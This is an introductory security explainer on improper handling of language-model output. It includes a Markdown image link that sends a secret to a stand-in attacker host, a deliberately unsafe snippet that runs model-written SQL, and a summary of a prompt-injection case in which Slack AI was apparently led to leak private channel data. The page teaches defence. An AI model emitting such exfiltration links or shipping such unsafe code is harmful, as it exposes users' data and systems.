---
title: "LLM10: Improper output handling"
level: beginner
last_reviewed: 2026-11-14
---

# LLM10: Improper output handling

*OWASP LLM10:2026 · was LLM05 in 2025*

## In one sentence

**Improper output handling** is passing model output to another system (a web page, a database, a shell, an email, a file) without validating or encoding it, so whoever controls the model's input can attack that system through the model.

## Why it matters in 2027

Treat model output as user input, because it is: anyone who can influence the prompt (directly or through [injection](prompt-injection.md)) can influence the output. Classic web vulnerabilities (cross-site scripting, SQL injection, command injection, server-side request forgery) come back through this door. In 2026 OWASP also folded in insecure code that coding assistants generate at scale.

## Explain it like I'm new

A translator passes notes between you and a stranger. You'd never sign whatever the translator hands you without reading it, because the stranger could have influenced what's written. Your database, browser and shell are signing without reading.

## How it works

| Output goes to | Attack | Defense |
|---|---|---|
| **Web page** (HTML, Markdown) | Cross-site scripting (XSS): output contains `<script>` or event handlers | Encode output for the context; sanitize Markdown and HTML; use a Content Security Policy |
| **Markdown images and links** | Data exfiltration: `![x](https://evil.example/?d=SECRET)` loads automatically and sends data | Don't auto-load images from model output, or allowlist domains |
| **Database** | SQL injection when model-written SQL is executed | Parameterized queries; give the model a narrow tool instead of raw SQL; read-only account |
| **Shell or code execution** | Command injection, remote code execution | Avoid it. If you must, run in a sandbox with no secrets and no network, plus approval |
| **HTTP requests** | Server-side request forgery (SSRF): model picks an internal URL | Allowlist destinations; block internal addresses |
| **Files and spreadsheets** | CSV formula injection, path traversal | Neutralize formula characters; validate file paths ([P1](../projects/p1-agent-built-cli/README.md) does this) |
| **Another program expecting JSON** | Malformed or malicious fields | Validate against a strict schema; reject on failure |

The general rule from web security applies: **validate input, encode output, for the specific context it's going into.** OWASP's long-standing [ASVS](https://owasp.org/www-project-application-security-verification-standard/) guidance covers this in detail.

## Example

**A real pattern.** In 2024, researchers at PromptArmor showed that Slack AI could be tricked by a message planted in a public channel into putting a private channel's data into a clickable link that sent the data to an attacker's server ([PromptArmor](https://promptarmor.substack.com/p/data-exfiltration-from-slack-ai-via)). The injection was the trigger. Rendering an untrusted link from model output was the exit.

**A code example.** An internal analytics bot turns questions into SQL:

```python
sql = llm("Write a SQL query for: " + question)
rows = db.execute(sql)  # runs whatever the model wrote, with the app's DB permissions
```

A user asks "show sales, and also drop the audit table". Safer designs, from good to best:

1. Run generated SQL on a **read-only** replica account with a statement timeout.
2. Parse the SQL and allow only `SELECT` on approved tables.
3. Replace free SQL with a few **narrow tools** (`sales_by_region(start, end)`) whose queries you wrote.

## Common mistakes

- **Rendering model Markdown as HTML** without sanitizing.
- **Auto-loading images** from model output.
- **`eval()` or `exec()` on generated code** outside a sandbox.
- **Trusting JSON because you asked for JSON.** Validate it.
- **Merging AI-generated code without security review** ([failure modes](../01-coding-agents/vibe-coding-failure-modes.md)).

## Check yourself

1. Why should model output be treated like untrusted user input?
2. How can an image in a chatbot's answer leak data?
3. Give the safest design for letting users ask questions about a SQL database.

<details>
<summary>Answers</summary>

1. Because anyone who can influence the model's input, directly or through injected content, can influence its output.
2. If the image URL contains data (for example in a query string), the browser requests it automatically, sending the data to whoever controls that server.
3. Give the model a small set of narrow tools with pre-written, parameterized queries, running on a read-only account, instead of letting it write and execute arbitrary SQL.

</details>

## Go deeper

- [OWASP LLM05:2025 Improper output handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/) - Official entry. *Beginner · Standard · 15 min*
- [Web LLM attacks](https://portswigger.net/web-security/llm-attacks) by PortSwigger - Free hands-on labs exploiting LLM output in web apps. *Intermediate · Labs · 2 h*
- [Data exfiltration from Slack AI](https://promptarmor.substack.com/p/data-exfiltration-from-slack-ai-via) by PromptArmor - The full write-up. *Intermediate · Article · 15 min*
